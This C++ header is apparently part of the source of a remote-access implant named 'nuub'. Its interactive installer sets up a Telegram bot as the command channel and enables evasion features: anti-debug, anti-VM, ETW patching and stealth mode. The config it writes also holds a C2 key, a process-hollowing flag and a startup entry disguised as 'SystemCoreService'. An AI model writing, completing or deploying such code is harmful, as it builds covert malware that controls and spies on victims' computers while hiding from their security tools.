#pragma once

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <algorithm>
#include <random>
#include <chrono>
#include <thread>

#include <nlohmann/json.hpp>

namespace nuub::domain {

class Installer {
    static std::string random_string(int length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.resize(length);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
        for (int i = 0; i < length; ++i) {
            result[i] = charset[dist(gen)];
        }
        return result;
    }

    static std::string read_line(const std::string& prompt, const std::string& default_value = "") {
        std::cout << prompt;
        if (!default_value.empty()) {
            std::cout << " [" << default_value << "]";
        }
        std::cout << ": ";

        std::string input;
        std::getline(std::cin, input);

        if (input.empty() && !default_value.empty()) {
            return default_value;
        }
        return input;
    }

    static int64_t read_number(const std::string& prompt, int64_t default_value) {
        std::string input = read_line(prompt, std::to_string(default_value));
        try {
            return std::stoll(input);
        } catch (...) {
            return default_value;
        }
    }

    static bool read_yes_no(const std::string& prompt, bool default_value = false) {
        std::string def = default_value ? "y" : "n";
        std::string input = read_line(prompt + " (y/n)", def);
        std::transform(input.begin(), input.end(), input.begin(), ::tolower);
        return input == "y" || input == "yes";
    }

public:
    // Run the interactive installer
    static bool run_setup(const std::string& config_path) {
        std::cout << R"(
 _   _ _   _  ___ _____    ___  ___   _   _  _____
| | | | \ | |/ _ \_   _|  / _ \|_ _| \ | |/ / _ \
| | | |  \| | | | || |   | | | || ||  \| | | | |
| |_| | |\  | |_| || |   | |_| || || |\  | |_| |
 \___/|_| \_|\___/ |_|    \___/___|_| \_|\___/

   Auto-Installer v2.0
)" << std::endl;

        std::cout << "First time setup. This will create your config file.\n" << std::endl;

        // Step 1: Telegram Bot Token
        std::cout << "[1/6] Telegram Bot Configuration" << std::endl;
        std::cout << "Create a bot via @BotFather on Telegram.\n" << std::endl;

        std::string bot_token = read_line("Bot Token");
        if (bot_token.empty()) {
            std::cerr << "[ERROR] Bot token is required!" << std::endl;
            return false;
        }

        // Step 2: Admin Chat IDs
        std::cout << "\n[2/6] Admin Configuration" << std::endl;
        std::cout << "Send /start to your bot and note your chat ID.\n" << std::endl;

        std::vector<std::string> admin_ids;
        std::string first_id = read_line("Admin Chat ID");
        if (!first_id.empty()) {
            admin_ids.push_back(first_id);
        }

        while (read_yes_no("Add another admin")) {
            std::string id = read_line("Admin Chat ID");
            if (!id.empty()) {
                admin_ids.push_back(id);
            }
        }

        if (admin_ids.empty()) {
            std::cerr << "[ERROR] At least one admin ID is required!" << std::endl;
            return false;
        }

        // Step 3: PC Identifier
        std::cout << "\n[3/6] PC Configuration" << std::endl;
        std::string pc_id = read_line("PC Identifier", "PC-001");

        // Step 4: Encryption Password
        std::cout << "\n[4/6] Security Configuration" << std::endl;
        std::string enc_password = read_line("Encryption Password (leave empty for random)");

        if (enc_password.empty()) {
            enc_password = random_string(16);
            std::cout << "Password generated (saved in config)." << std::endl;
        }

        // Step 5: Advanced
        std::cout << "\n[5/6] Advanced Configuration" << std::endl;
        int64_t heartbeat = read_number("Heartbeat interval (minutes)", 30);

        // Step 6: Evasion
        std::cout << "\n[6/6] Evasion Configuration" << std::endl;
        bool anti_debug = read_yes_no("Enable anti-debug detection", true);
        bool anti_vm = read_yes_no("Enable anti-VM detection", false);
        bool etw_patch = read_yes_no("Enable ETW patching", true);
        bool stealth = read_yes_no("Enable stealth mode (anti-VM + anti-debug)", false);

        // Generate JSON using nlohmann::json (safe, no injection)
        nlohmann::json j;
        j["telegram_bot_token"] = bot_token;

        // Parse admin IDs as integers
        std::vector<int64_t> admin_ids_int;
        for (const auto& id : admin_ids) {
            try {
                admin_ids_int.push_back(std::stoll(id));
            } catch (...) {
                std::cerr << "[WARNING] Invalid chat ID ignored: " << id << std::endl;
            }
        }
        j["admin_chat_id"] = admin_ids_int.empty() ? 0 : admin_ids_int[0];
        j["admin_chat_ids"] = admin_ids_int;
        j["pc_identifier"] = pc_id;
        j["encryption_password"] = enc_password;
        j["master_log_filename"] = "log_master.txt";
        j["activity_log_filename"] = "activity_log.csv";
        j["auto_start_entry_name"] = "SystemCoreService";
        j["log_filename"] = "nuub.log";
        j["heartbeat_interval_minutes"] = heartbeat;
        j["c2_encryption_key"] = "";
        j["stealth_mode"] = stealth;
        j["anti_debug"] = anti_debug;
        j["anti_vm"] = anti_vm;
        j["etw_patch"] = etw_patch;
        j["process_hollowing"] = false;

        std::string json = j.dump(4);

        // Write config
        std::ofstream file(config_path);
        if (!file.is_open()) {
            std::cerr << "[ERROR] Could not create " << config_path << std::endl;
            return false;
        }
        file << json;
        file.close();

        std::cout << "\n[OK] Configuration saved to " << config_path << std::endl;
        std::cout << "Starting agent...\n" << std::endl;
        
        // Progress bar animation (5 steps simulating initialization)
        std::vector<std::string> stages = {
            "Initializing core components",
            "Loading configuration modules",
            "Initializing Telegram connection",
            "Starting command listener",
            "Agent ready!"
        };
        
        for (size_t i = 0; i < stages.size(); ++i) {
            int percent = ((i + 1) * 100) / stages.size();
            int filled = (percent / 5);
            
            std::cout << "\r[" << stages[i] << "] ";
            std::cout << "[";
            for (int j = 0; j < 20; ++j) {
                std::cout << (j < filled ? "█" : "░");
            }
            std::cout << "] " << percent << "%";
            std::cout.flush();
            
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
        std::cout << "\n" << std::endl;

        return true;
    }

    // Check if setup is needed
    static bool needs_setup(const std::string& config_path) {
        std::ifstream file(config_path);
        return !file.good();
    }
};

} // namespace nuub::domain
